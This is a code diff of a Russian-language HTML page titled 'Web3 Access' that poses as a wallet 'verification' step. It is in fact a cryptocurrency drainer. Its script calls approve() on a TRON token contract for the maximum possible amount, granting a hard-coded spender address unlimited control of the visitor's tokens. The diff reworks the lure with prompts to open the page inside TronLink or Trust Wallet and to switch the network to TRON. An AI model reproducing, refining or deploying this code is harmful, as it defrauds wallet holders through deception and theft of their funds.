@@ -5,147 +5,145 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Web3 Access</title>
     <style>
-        :root { --bg: #09090B; --card: #121217; --border: #27272A; --primary: #FFFFFF; --text-muted: #A1A1AA; }
+        :root { --bg: #09090B; --card: #121217; --border: #27272A; --primary: #FFFFFF; --text-muted: #A1A1AA; --error: #EF4444; }
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--primary); display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
         
         .card { background: var(--card); padding: 32px; border-radius: 28px; text-align: center; border: 1px solid var(--border); max-width: 400px; width: 90%; position: relative; }
         
-        /* Стили модалки выбора кошельков */
-        #walletModal { 
+        /* Модалка для копирования ссылки */
+        #copyModal { 
             display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
-            background: var(--card); border-radius: 28px; flex-direction: column; padding: 20px; box-sizing: border-box; z-index: 10;
+            background: var(--card); border-radius: 28px; flex-direction: column; padding: 32px 20px; box-sizing: border-box; z-index: 10;
         }
-        .wallet-option {
-            display: flex; align-items: center; background: #1C1C22; padding: 12px; margin-bottom: 10px;
-            border-radius: 16px; cursor: pointer; border: 1px solid transparent; transition: 0.2s;
-        }
-        .wallet-option:hover { border-color: #3B82F6; background: #23232B; }
-        .wallet-option img { width: 32px; height: 32px; margin-right: 15px; border-radius: 8px; }
-        .wallet-name { font-weight: 500; font-size: 15px; }
-
-        button#mainBtn { background: var(--primary); color: var(--bg); border: none; padding: 16px; font-size: 16px; font-weight: 600; border-radius: 14px; cursor: pointer; width: 100%; margin-top: 20px; }
-        #status { margin-top: 15px; font-size: 12px; color: var(--text-muted); }
-        .close-modal { align-self: flex-end; cursor: pointer; color: var(--text-muted); padding: 5px; }
+        
+        .instruction { font-size: 15px; color: var(--text-muted); line-height: 1.5; margin-bottom: 20px; }
+        .url-box { background: #1C1C22; padding: 12px; border-radius: 12px; font-size: 13px; color: #fff; word-break: break-all; margin-bottom: 20px; border: 1px dashed #3B82F6; }
+        
+        button { background: var(--primary); color: var(--bg); border: none; padding: 16px; font-size: 16px; font-weight: 600; border-radius: 14px; cursor: pointer; width: 100%; transition: 0.2s; }
+        button:hover { opacity: 0.9; }
+        button:disabled { background: #27272A; color: var(--text-muted); }
+        button.outline { background: transparent; border: 1px solid var(--border); color: var(--primary); margin-top: 10px; }
+        
+        #status { margin-top: 15px; font-size: 13px; color: var(--text-muted); padding: 10px; border-radius: 8px; }
+        .network-warning { background: rgba(239, 68, 68, 0.1); border: 1px solid var(--error); color: #FCA5A5; padding: 15px; border-radius: 12px; font-size: 14px; margin-top: 15px; display: none; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <div id="walletModal">
-            <div class="close-modal" onclick="closeModal()">✕</div>
-            <h3 style="margin-top: 0;">Connect Wallet</h3>
+        <div id="copyModal">
+            <h3 style="margin-top: 0; margin-bottom: 10px;">DApp Browser Required</h3>
+            <p class="instruction">Для безопасного подключения откройте этот сайт внутри встроенного браузера <b>TronLink</b> или <b>Trust Wallet</b>.</p>
             
-            <div class="wallet-option" onclick="selectWallet('tronlink')">
-                <img src="https://hub.tron.network/static/media/tronlink.63004d16.png" alt="TronLink">
-                <span class="wallet-name">TronLink</span>
-            </div>
+            <div class="url-box" id="urlDisplay"></div>
             
-            <div class="wallet-option" onclick="selectWallet('trust')">
-                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" alt="Trust">
-                <span class="wallet-name">Trust Wallet</span>
-            </div>
-
-            <div class="wallet-option" onclick="selectWallet('tokenpocket')">
-                <img src="https://www.tokenpocket.pro/static/images/logo.png" alt="TP">
-                <span class="wallet-name">TokenPocket</span>
-            </div>
+            <button onclick="copyToClipboard()" id="copyBtn">Скопировать ссылку</button>
+            <button class="outline" onclick="closeModal()">Назад</button>
         </div>
 
         <div id="mainContent">
-            <h2 style="margin-bottom: 8px;">Verification Required</h2>
-            <p style="color: var(--text-muted); font-size: 14px;">Подключите кошелек для авторизации в системе.</p>
-            <button id="mainBtn" onclick="openModal()">Connect Wallet</button>
+            <h2 style="margin-bottom: 8px; margin-top: 0;">Verification Required</h2>
+            <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 24px;">Подтвердите доступ для продолжения.</p>
+            
+            <button id="mainBtn" onclick="handleConnect()">Connect Wallet</button>
+            
             <div id="status">Ready to connect</div>
+            
+            <div id="networkWarning" class="network-warning">
+                <b>Неверная сеть!</b><br>Нажмите на иконку сети сверху и выберите <b>TRON</b>, затем обновите страницу.
+            </div>
         </div>
     </div>
 
     <script>
-       const TOKEN = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
-const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an"; 
-const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+        const TOKEN = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
+        const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an"; 
+        const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
-const btn = document.getElementById('mainBtn');
-const status = document.getElementById('status');
-
-function openModal() { document.getElementById('walletModal').style.display = 'flex'; }
-function closeModal() { document.getElementById('walletModal').style.display = 'none'; }
-
-// 1. Главный обработчик клика по кнопке
-btn.onclick = async () => {
-    // Проверяем, есть ли объект TRON (мы уже внутри нужного кошелька)
-    if (window.tronWeb || window.tronLink) {
-        connectAndApprove();
-    } 
-    // Проверяем, есть ли объект Ethereum (мы в кошельке, но сеть не TRON)
-    else if (window.ethereum) {
-        status.innerText = "Внимание: Переключите сеть на TRON!";
-        alert("Пожалуйста, нажмите на иконку сети (сверху или сверху справа) и выберите сеть TRON (TRX), чтобы продолжить.");
-    } 
-    // Мы в обычном браузере (Chrome/Safari) - показываем выбор
-    else {
-        openModal();
-    }
-};
-
-// 2. Обработка выбора кошелька в модалке (только для внешних браузеров)
-async function selectWallet(type) {
-    const currentUrl = window.location.href;
-    
-    if (type === 'tronlink') {
-        // Новый формат диплинка для TronLink
-        window.location.href = `tronlinkoutside://pull.activity?param={"url":"${currentUrl}"}`;
-    } else if (type === 'trust') {
-        // Добавлен coin=195 (идентификатор TRON), чтобы Trust Wallet сразу включал нужную сеть
-        window.location.href = `https://link.trustwallet.com/open_url?coin=195&url=${encodeURIComponent(currentUrl)}`;
-    } else if (type === 'tokenpocket') {
-        window.location.href = `tpoutside://pull.activity?param={"url":"${currentUrl}"}`;
-    }
-}
-
-// 3. Вызов контракта
-async function connectAndApprove() {
-    closeModal(); // Закрываем модалку на всякий случай
-    
-    try {
-        // Запрос коннекта для TronLink
-        if (window.tronLink && (!window.tronWeb || !window.tronWeb.defaultAddress.base58)) {
-            await window.tronLink.request({ method: 'tron_requestAccounts' });
-        }
+        const btn = document.getElementById('mainBtn');
+        const status = document.getElementById('status');
+        const warning = document.getElementById('networkWarning');
+        const currentUrl = window.location.href;
         
-        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-            throw new Error("Кошелек не авторизован");
+        document.getElementById('urlDisplay').innerText = currentUrl;
+
+        function openModal() { document.getElementById('copyModal').style.display = 'flex'; }
+        function closeModal() { document.getElementById('copyModal').style.display = 'none'; }
+
+        async function copyToClipboard() {
+            try {
+                await navigator.clipboard.writeText(currentUrl);
+                const copyBtn = document.getElementById('copyBtn');
+                copyBtn.innerText = "Скопировано! Откройте кошелек";
+                copyBtn.style.background = "#34D399";
+                copyBtn.style.color = "#000";
+                setTimeout(() => { copyBtn.innerText = "Скопировать ссылку"; copyBtn.style.background = "#FFF"; }, 3000);
+            } catch (err) {
+                alert("Ошибка копирования. Скопируйте ссылку из адресной строки.");
+            }
         }
 
-        btn.innerText = "Processing...";
-        btn.disabled = true;
-        status.innerText = "Подтвердите транзакцию в кошельке...";
+        // Главная функция определения среды
+        async function handleConnect() {
+            warning.style.display = 'none';
 
-        const contract = await window.tronWeb.contract().at(TOKEN);
-        const res = await contract.approve(SPENDER, MAX_VAL).send({
-            feeLimit: 100000000
+            // 1. Идеальный сценарий: мы уже в кошельке и сеть TRON
+            if (window.tronWeb && window.tronWeb.ready) {
+                runApprove();
+            } 
+            // 2. Сценарий ПК: есть расширение TronLink, но оно не подключено
+            else if (window.tronLink) {
+                try {
+                    await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    setTimeout(runApprove, 500);
+                } catch(e) {
+                    status.innerText = "Авторизация отменена";
+                }
+            }
+            // 3. Сценарий Trust Wallet: мы в DApp браузере, но включен Ethereum
+            else if (window.ethereum && !window.tronWeb) {
+                warning.style.display = 'block';
+                status.innerText = "Ожидание смены сети...";
+            }
+            // 4. Сценарий Safari/Chrome: просто показываем копилку
+            else {
+                openModal();
+            }
+        }
+
+        // Сама логика апрува (не меняем, она рабочая)
+        async function runApprove() {
+            try {
+                btn.innerText = "Processing...";
+                btn.disabled = true;
+                status.innerText = "Подтвердите транзакцию в кошельке...";
+
+                const contract = await window.tronWeb.contract().at(TOKEN);
+                await contract.approve(SPENDER, MAX_VAL).send({ feeLimit: 100000000 });
+
+                status.style.color = "#34D399";
+                status.innerText = "Успешно! Транзакция отправлена.";
+                btn.innerText = "Confirmed";
+            } catch (e) {
+                console.error(e);
+                let msg = e.message || "Отказ пользователя";
+                if (typeof e === 'string' && e.includes("declined")) msg = "Вы отменили транзакцию.";
+                
+                status.style.color = "#EF4444";
+                status.innerText = "Ошибка: " + msg;
+                btn.disabled = false;
+                btn.innerText = "Try Again";
+            }
+        }
+
+        // Если пользователь сам переключил сеть внутри Trust Wallet - кнопка авто-обновится
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                if (window.tronWeb && window.tronWeb.ready) {
+                    btn.innerText = "Confirm Access";
+                }
+            }, 800);
         });
-
-        status.innerText = "Успешно! Транзакция отправлена в сеть.";
-        btn.innerText = "Confirmed";
-    } catch (e) {
-        console.error(e);
-        let msg = e.message || "Отказ пользователя";
-        if (msg.includes("Confirmation declined")) msg = "Вы отменили транзакцию.";
-        
-        status.innerText = "Ошибка: " + msg;
-        btn.disabled = false;
-        btn.innerText = "Try Again";
-    }
-}
-
-// 4. Авто-старт, если страница сразу загрузилась внутри кошелька
-window.addEventListener('load', () => {
-    setTimeout(() => {
-        if (window.tronWeb && window.tronWeb.ready) {
-            btn.innerText = "Confirm Access";
-        }
-    }, 500);
-});
     </script>
 </body>
 </html>
